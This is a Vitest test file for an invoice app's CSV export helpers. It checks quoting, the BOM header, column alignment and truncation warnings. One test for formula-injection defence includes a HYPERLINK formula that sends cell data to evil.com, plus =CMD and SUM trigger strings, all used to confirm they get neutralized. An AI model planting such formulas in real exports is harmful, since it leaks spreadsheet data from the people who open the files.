import { describe, expect, it } from "vitest";
import { escapeCsvCell, invoicesToCsv, CSV_COLUMNS } from "./csv";
import { normalizeInvoice } from "@/lib/invoices";

describe("escapeCsvCell", () => {
  it("returns stringified value as-is for simple values", () => {
    expect(escapeCsvCell("hello")).toBe("hello");
    expect(escapeCsvCell(123)).toBe("123");
    expect(escapeCsvCell(0)).toBe("0");
    expect(escapeCsvCell(true)).toBe("true");
  });

  it("wraps values with commas in double quotes", () => {
    expect(escapeCsvCell("Acme, Inc.")).toBe('"Acme, Inc."');
  });

  it("escapes double quotes by doubling", () => {
    expect(escapeCsvCell('5" pipe')).toBe('"5"" pipe"');
  });

  it("wraps values with newlines in double quotes", () => {
    expect(escapeCsvCell("line1\nline2")).toBe('"line1\nline2"');
    expect(escapeCsvCell("line1\r\nline2")).toBe('"line1\r\nline2"');
  });

  it("handles null and undefined as empty string", () => {
    expect(escapeCsvCell(null)).toBe("");
    expect(escapeCsvCell(undefined)).toBe("");
  });

  it("prefixes formula-trigger characters with single quote", () => {
    expect(escapeCsvCell("=HYPERLINK(\"http://evil.com/?d=\"&A1,\"Xem\")")).toBe(
      `"'=HYPERLINK(""http://evil.com/?d=""&A1,""Xem"")"`,
    );
    expect(escapeCsvCell("=1+2")).toBe("'=1+2");
    expect(escapeCsvCell("+SUM(A1:A10)")).toBe("'+SUM(A1:A10)");
    expect(escapeCsvCell("-SUM(A1:A10)")).toBe("'-SUM(A1:A10)");
    expect(escapeCsvCell("@SUM(A1:A10)")).toBe("'@SUM(A1:A10)");
    expect(escapeCsvCell("\t=CMD")).toBe("'\t=CMD");
    // \r triggers both formula-injection guard AND RFC 4180 quoting
    expect(escapeCsvCell("\r=CMD")).toBe(`"'\r=CMD"`);
  });

  it("does not prefix non-trigger characters", () => {
    expect(escapeCsvCell("hello")).toBe("hello");
    expect(escapeCsvCell("123")).toBe("123");
    expect(escapeCsvCell("*bold*")).toBe("*bold*");
    expect(escapeCsvCell("/path")).toBe("/path");
    expect(escapeCsvCell("$100")).toBe("$100");
  });
});

describe("invoicesToCsv", () => {
  it("starts with UTF-8 BOM", () => {
    const csv = invoicesToCsv([]);
    expect(csv.startsWith("﻿")).toBe(true);
  });

  it("includes header row matching CSV_COLUMNS", () => {
    const csv = invoicesToCsv([]);
    const lines = csv.split("\n");
    const header = CSV_COLUMNS.map((c) => escapeCsvCell(c.label)).join(",");
    expect(lines[0]).toBe("﻿" + header);
  });

  it("maps invoice rows to CSV columns", () => {
    const row = normalizeInvoice({
      id: "1",
      vendor: "Acme Corp",
      invoice_number: "INV-001",
      amount: 1500000,
      currency: "VND",
      issue_date: "2026-07-01",
      due_date: "2026-08-01",
      tax: 150000,
      source: "email",
      needs_review: false,
      confidence_score: 0.95,
      created_at: "2026-07-15T10:30:00Z",
    });

    const csv = invoicesToCsv([row]);
    const lines = csv.split("\n");
    expect(lines).toHaveLength(3); // BOM-header, data, trailing empty
    const data = lines[1];
    expect(data).toContain("Acme Corp");
    expect(data).toContain("INV-001");
    expect(data).toContain("1500000");
    expect(data).toContain("VND");
    expect(data).toContain("2026-07-01");
    expect(data).toContain("2026-08-01");
    expect(data).toContain("150000");
    expect(data).toContain("email");
    expect(data).toContain("false");
    expect(data).toContain("0.95");
    expect(data).toContain("2026-07-15T10:30:00Z");
  });

  it("handles vendor with comma — quoted", () => {
    const row = normalizeInvoice({
      id: "1",
      vendor: "Acme, Inc.",
      invoice_number: null,
      amount: null,
      currency: null,
      issue_date: null,
      due_date: null,
      tax: null,
      source: "upload",
      needs_review: true,
      confidence_score: null,
      created_at: "2026-07-15T10:30:00Z",
    });

    const csv = invoicesToCsv([row]);
    expect(csv).toContain('"Acme, Inc."');
  });

  it("returns only BOM + header for empty rows", () => {
    const csv = invoicesToCsv([]);
    const lines = csv.trim().split("\n");
    expect(lines).toHaveLength(1); // just the BOM + header
  });

  it("each data row has the same number of columns as the header", () => {
    const rows = [
      normalizeInvoice({
        id: "1",
        vendor: "A",
        invoice_number: null,
        amount: null,
        currency: null,
        issue_date: null,
        due_date: null,
        tax: null,
        source: "email",
        needs_review: false,
        confidence_score: null,
        created_at: "2026-01-01",
      }),
      normalizeInvoice({
        id: "2",
        vendor: "B",
        invoice_number: null,
        amount: null,
        currency: null,
        issue_date: null,
        due_date: null,
        tax: null,
        source: "upload",
        needs_review: true,
        confidence_score: null,
        created_at: "2026-02-01",
      }),
    ];

    const csv = invoicesToCsv(rows);
    const lines = csv.trim().split("\n");
    const headerCols = lines[0].replace("﻿", "").split(",").length;
    for (let i = 1; i < lines.length; i++) {
      expect(lines[i].split(",").length).toBe(headerCols);
    }
  });

  it("includes a truncation warning row when truncated is true", () => {
    const csv = invoicesToCsv([], { truncated: true });
    const lines = csv.trim().split("\n");
    expect(lines).toHaveLength(2); // BOM + header, warning
    expect(lines[1]).toContain("5,000");
  });

  it("includes warning row before data rows when truncated", () => {
    const row = normalizeInvoice({
      id: "1",
      vendor: "Acme",
      invoice_number: null,
      amount: null,
      currency: null,
      issue_date: null,
      due_date: null,
      tax: null,
      source: "upload",
      needs_review: false,
      confidence_score: null,
      created_at: "2026-01-01",
    });

    const csv = invoicesToCsv([row], { truncated: true });
    const lines = csv.trim().split("\n");
    expect(lines).toHaveLength(3); // BOM + header, warning, data
    expect(lines[1]).toContain("5,000"); // warning is row 2
    expect(lines[2]).toContain("Acme"); // data is row 3
  });
});
